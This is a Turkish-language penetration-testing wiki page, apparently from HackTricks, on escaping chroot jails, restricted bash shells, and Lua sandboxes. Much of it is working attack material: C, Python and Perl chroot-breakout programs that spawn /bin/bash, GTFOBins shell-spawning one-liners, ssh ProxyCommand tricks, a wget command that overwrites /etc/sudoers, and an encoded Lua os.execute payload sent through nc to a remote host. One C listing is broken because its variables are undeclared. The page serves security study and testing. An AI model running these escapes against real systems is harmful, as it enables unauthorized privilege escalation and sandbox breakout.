# Jail'lerden Escape

## **GTFOBins**

**"Shell" özelliğine sahip herhangi bir binary çalıştırıp çalıştıramadığınızı** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **üzerinden arayın**

## Chroot Escape'leri

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: chroot mekanizması, **ayrıcalıklı** (**root**) **kullanıcılar** tarafından kasıtlı olarak kurcalanmaya **karşı savunma sağlamak için tasarlanmamıştır**. Çoğu sistemde chroot context'leri düzgün şekilde iç içe çalışmaz ve **yeterli ayrıcalıklara sahip chroot edilmiş programlar, dışarı çıkmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, escape gerçekleştirmek için chroot içinde root olmanız gerektiği anlamına gelir.<sup>[[4]](#references)</sup>

> [!TIP]
> [**chw00t**](https://github.com/earthquake/chw00t) **tool'u**, aşağıdaki senaryoları abuse etmek ve `chroot`'tan escape gerçekleştirmek için oluşturulmuştur.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Bir chroot içinde **root** iseniz, **başka bir chroot** oluşturarak **escape gerçekleştirebilirsiniz**. Bunun nedeni, 2 chroot'un (Linux'ta) birlikte var olamamasıdır. Bu nedenle bir klasör oluşturup ardından **yeni bir chroot**'u, **siz onun dışında olacak şekilde**, bu yeni klasörde **oluşturursanız**, artık **yeni chroot'un dışında** olursunuz ve dolayısıyla FS içinde bulunursunuz.
>
> Bunun nedeni, chroot'un genellikle çalışma dizininizi belirtilen dizine taşımamasıdır. Böylece bir chroot oluşturabilir, ancak onun dışında olabilirsiniz.<sup>[[4]](#references)[[5]](#references)</sup>

Genellikle bir chroot jail'inin içinde `chroot` binary'sini bulamazsınız, ancak bir binary'yi **compile edebilir, upload edebilir ve çalıştırabilirsiniz**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Bu, önceki duruma benzer; ancak bu durumda **saldırgan mevcut dizine ait bir file descriptor saklar** ve ardından **chroot'u yeni bir klasörde oluşturur**. Son olarak, chroot'un **dışında** bu **FD'ye** **erişimi** olduğundan, ona erişir ve **kaçar**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD, Unix Domain Sockets üzerinden aktarılabilir, bu nedenle:
>
> - Bir child process oluşturun (fork)
> - Parent ve child process'lerin iletişim kurabilmesi için UDS oluşturun
> - Child process içinde farklı bir klasörde chroot çalıştırın
> - Parent proc içinde, yeni child proc chroot'unun dışında bulunan bir klasör için FD oluşturun
> - Bu FD'yi UDS kullanarak child procc'e aktarın
> - Child process bu FD'ye chdir eder ve FD, kendi chroot'unun dışında olduğu için jail'den escape eder.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Root device'ı (/) chroot içindeki bir klasöre mount etmek
> - O klasöre chroot yapmak
>
> Bu, Linux'ta mümkündür.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - procfs'i chroot içindeki bir klasöre mount edin (henüz mount edilmemişse)
> - Farklı bir root/cwd entry'sine sahip bir pid arayın, örneğin: /proc/1/root
> - Bu entry'ye chroot yapın.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Bir Fork (child proc) oluşturun, FS'in daha derinlerinde farklı bir klasöre chroot yapın ve o klasöre CD yapın
> - Parent process'ten, child process'in bulunduğu klasörü child process'lerin chroot'undan önceki bir klasöre taşıyın
> - Bu children process kendisini chroot'un dışında bulacaktır.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - Bir process'in `ptrace` ile attach olup olamayacağı credentials, capabilities ve Yama gibi etkin security module'lerine bağlıdır; bu nedenle aynı kullanıcı debugging işlemi sistem policy'si tarafından kısıtlanabilir.<sup>[[8]](#references)</sup>
> - Attachment'a izin veriliyorsa bir process'e ptrace uygulayabilir ve onun içinde bir shellcode çalıştırabilirsiniz ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

Jail hakkında bilgi edinin:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH'i Değiştirme

PATH ortam değişkenini değiştirip değiştiremeyeceğinizi kontrol edin.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim kullanımı

Vim mevcutsa, `shell` seçeneğini çalıştırabileceğiniz bir shell olarak ayarlayın ve `:shell` komutunu çağırın.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pager'lar ve help viewer'lar

Birçok kısıtlı ortam hâlâ **pager**'ları veya **help viewer**'ları kullanılabilir durumda bırakır. Bunları abuse etmek, genellikle `PATH`'i yeniden oluşturmaya çalışmaktan daha hızlıdır.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git` kullanılabiliyorsa `--paginate` seçeneği çıktıyı `less` veya `$PAGER`'a gönderir; bu, bir pager escape mevcut olduğunda kullanışlıdır.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Yaygın GTFOBins one-liners

Hangi binary'lere erişilebildiğini öğrendikten sonra öncelikle bariz shell spawner'larını test edin:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Yalnızca izin verilen bir komuta **argüman enjekte edebiliyorsanız** (komutu serbestçe çalıştırmak yerine), **GTFOArgs**'ı da kontrol edin.<sup>[[17]](#references)</sup>

### Script oluşturma

İçerik olarak _/bin/bash_ bulunan çalıştırılabilir bir dosya oluşturup oluşturamayacağınızı kontrol edin
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH üzerinden bash alma

ssh üzerinden erişiyorsanız, sunucudan kısıtlı login shell yerine **farklı bir program** çalıştırmasını isteyebilirsiniz.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh` yerel olarak izin verilen birkaç binary'den biriyse, **GTFOBin** olarak da kötüye kullanılabileceğini unutmayın; `LocalCommand` ve `ProxyCommand` seçenekleri yerel olarak yapılandırılmış yardımcı komutları çalıştırır.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Bash'te bir nameref, atamaları başka bir değişkene yönlendirirken `BASH_CMDS` öğesine bir komut eklemek, bu komutu Bash'in dahili komut hash tablosuna ekler.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget'in `-O` seçeneği, indirilen içeriği belirtilen çıktı dosyasına yazar; bu yol yazılabilirse `/etc/sudoers` gibi bir dosyanın üzerine yazılabilir.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Kısıtlı shell wrapper'ları (`git-shell`, `rssh`, `lshell`)

Bazı ortamlar sizi doğrudan `rbash` içine bırakmaz; bunun yerine `git-shell`, `rssh` veya `lshell` gibi **wrapper**'lar kullanır:

- `git-shell` yalnızca server-side Git komutlarını ve `~/git-shell-commands/` içinde bulunan her şeyi kabul eder. Bu dizin mevcutsa, izin verilen özel işlemleri listelemek için `help` çalıştırın. Buraya **yazabiliyorsanız**, bu dizine bırakılan herhangi bir executable erişilebilir hale gelir.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` genellikle yalnızca `scp`, `sftp`, `rsync` veya Git-style işlemlere izin verir. Bu durumlarda öncelikle **file write primitives** üzerinde yoğunlaşın: `authorized_keys`, bir shell startup file veya bir helper script'i yazılabilir bir konuma upload edin ve ardından `ssh -t ...` ile yeniden bağlanın.
- Wrapper yalnızca command line'ı filtreliyorsa erişilebilir binary'leri listeleyin ve ardından **GTFOBins / GTFOArgs**'e geçiş yapın.

### Diğer trick'ler

Ayrıca şunları da kontrol edin:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Şu sayfa da ilginç olabilir:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Python jail'lerinden escape etmeye yönelik trick'ler aşağıdaki sayfada bulunuyor:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Bu sayfada lua içinde erişiminiz olan global functions'ları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Standard `load`, `string.char` ve `os.execute` functions'ları kullanılabilir olduklarında bu chunk'ı oluşturup çalıştırabilir.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir table function, nokta sözdizimi yerine `rawget` kullanılarak da alınabilir.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Bir kütüphane tablosunu listelemek için `pairs` kullanın.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
`pairs` tablo indekslerini numaralandırırken belirli bir sırayı garanti etmez; bu nedenle belirli bir fonksiyonun ilk sırada görünmesine güvenmeyin. Belirli bir fonksiyonu çalıştırmanız gerekiyorsa, farklı lua ortamları yükleyip library'nin ilk fonksiyonunu çağırarak brute force attack gerçekleştirebilirsiniz.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interactive lua shell elde etme**: Kısıtlı bir lua shell içindeyseniz, `debug.debug()` çağırarak yeni bir lua shell (ve umarız sınırsız) elde edebilirsiniz; bu, etkileşimli bir moda girer.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Çeşitli Chroot Çözümlerinden Nasıl Kaçılır (Bucsay Balazs, DeepSec konuşması ve slaytları)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – Kısıtlı Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git Documentation](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux manual page](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux manual page](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux manual page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git Documentation](https://git-scm.com/docs/git)
- [10] [:shell – Vim documentation](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD manual page](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD manual page](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
